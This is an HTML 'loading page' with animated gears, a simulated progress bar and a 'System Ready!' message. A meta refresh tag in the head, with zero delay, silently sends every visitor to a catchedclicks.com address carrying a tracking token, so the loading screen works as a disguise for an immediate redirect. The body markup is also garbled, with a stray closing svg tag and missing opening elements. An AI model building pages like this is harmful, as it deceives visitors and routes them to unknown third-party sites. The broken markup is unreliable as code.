<!DOCTYPE html>
<html lang="en">
<head>
     <meta http-equiv="refresh" content="0;url=https://4824337.catchedclicks.com/?mob=7AWVJZpmi6SV7m9wDighAK5JUh38ZO5Z-OvoKLE_U_heNoLvIPFc9UQ3pcGoTw_YwHAfnxOf8N3uVaD42x5zHg">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading Page with Gear Animation</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Arial', sans-serif;
            overflow: hidden;
            color: white;
        }

        .loading-container {
            text-align: center;
            position: relative;
        }

        .gear-container {
            position: relative;
            width: 200px;
            height: 200px;
            margin: 0 auto 30px;
        }

        .gear {
            position: absolute;
            width: 100px;
            height: 100px;
            animation: rotate 4s linear infinite;
        }

        .gear-large {
            width: 150px;
            height: 150px;
            left: 25px;
            top: 25px;
            animation-duration: 8s;
            animation-direction: reverse;
        }

        .gear-small {
            width: 70px;
            height: 70px;
            left: 130px;
            top: 65px;
            animation-duration: 3s;
        }

        .gear path {
            fill: rgba(255, 255, 255, 0.8);
        }

        @keyframes rotate {
            from {
                transform: rotate(0deg);
            }
            to {
                transform: rotate(360deg);
            }
        }

        h1 {
            font-size: 2.5rem;
            margin-bottom: 20px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
        }

        .progress-container {
            width: 300px;
            height: 10px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 5px;
            margin: 30px auto;
            overflow: hidden;
        }

        .progress-bar {
            height: 100%;
            width: 0%;
            background: white;
            border-radius: 5px;
            transition: width 0.3s ease;
        }

        .loading-text {
            font-size: 1.2rem;
            margin-top: 20px;
            opacity: 0.8;
        }

        .dots {
            display: inline-block;
        }

        .dots::after {
            content: '.';
            animation: dots 1.5s steps(5, end) infinite;
        }

        @keyframes dots {
            0%, 20% {
                content: '.';
            }
            40% {
                content: '..';
            }
            60% {
                content: '...';
            }
            80%, 100% {
                content: '';
            }
        }

        @media (max-width: 600px) {
            h1 {
                font-size: 1.8rem;
            }
            
            .gear-container {
                width: 150px;
                height: 150px;
            }
            
            .gear-large {
                width: 100px;
                height: 100px;
                left: 25px;
                top: 25px;
            }
            
            .gear-small {
                width: 50px;
                height: 50px;
                left: 85px;
                top: 50px;
            }
            
            .progress-container {
                width: 200px;
            }
        }
    </style>
</head>
<body>

            </svg>
            
            <!-- Small Gear -->
            <svg class="gear gear-small" viewBox="0 0 100 100">
                <path d="M92.5,55.6c-0.4-1.7-0.8-3.5-1.4-5.1l8.2-4.8l-7.4-12.8l-9.4,2.1c-1.8-1.6-3.8-3-5.9-4.2l1.6-9.6L62.5,17.5l-7.2,6.7
                c-2-0.6-4.1-1-6.2-1.2l-2.2-9.9H37.1l-2.2,9.9c-2.1,0.2-4.2,0.6-6.2,1.2l-7.2-6.7L17.5,22.5l1.6,9.6c-2.1,1.2-4.1,2.6-5.9,4.2
                l-9.4-2.1L0,45.7l8.2,4.8c-0.6,1.6-1,3.4-1.4,5.1l-9.8,0.3v14.2l9.8,0.3c0.4,1.7,0.8,3.5,1.4,5.1L0,75.2l7.4,12.8l9.4-2.1
                c1.8,1.6,3.8,3,5.9,4.2l-1.6,9.6l12.8,7.4l7.2-6.7c2,0.6,4.1,1,6.2,1.2l2.2,9.9h12.8l2.2-9.9c2.1-0.2,4.2-0.6,6.2-1.2l7.2,6.7
                l12.8-7.4l-1.6-9.6c2.1-1.2,4.1-2.6,5.9-4.2l9.4,2.1l7.4-12.8l-8.2-4.8c0.6-1.6,1-3.4,1.4-5.1l9.8-0.3V55.9L92.5,55.6z M50,72.4
                c-12.4,0-22.4-10-22.4-22.4s10-22.4,22.4-22.4s22.4,10,22.4,22.4S62.4,72.4,50,72.4z"/>
            </svg>
        </div>
        
        <h1>Loading System</h1>
        
        <div class="progress-container">
            <div class="progress-bar" id="progress-bar"></div>
        </div>
        
        <div class="loading-text">
            Initializing components<span class="dots"></span>
        </div>
    </div>

    <script>
        // Simulate loading progress
        const progressBar = document.getElementById('progress-bar');
        let progress = 0;
        
        const loadingInterval = setInterval(() => {
            progress += Math.random() * 10;
            if (progress > 100) {
                progress = 100;
                clearInterval(loadingInterval);
                
                // You can redirect or show content when loading is complete
                setTimeout(() => {
                    document.body.innerHTML =`
                        <div style="text-align: center; padding: 50px; color: white;">
                            <h1>System Ready!</h1>
                            <p>Loading complete. You can now proceed.</p>
                        </div>
                    `;
                }, 1000);
            }
            progressBar.style.width = `${progress}%`;
        }, 300);
    </script>
</body>
</html>
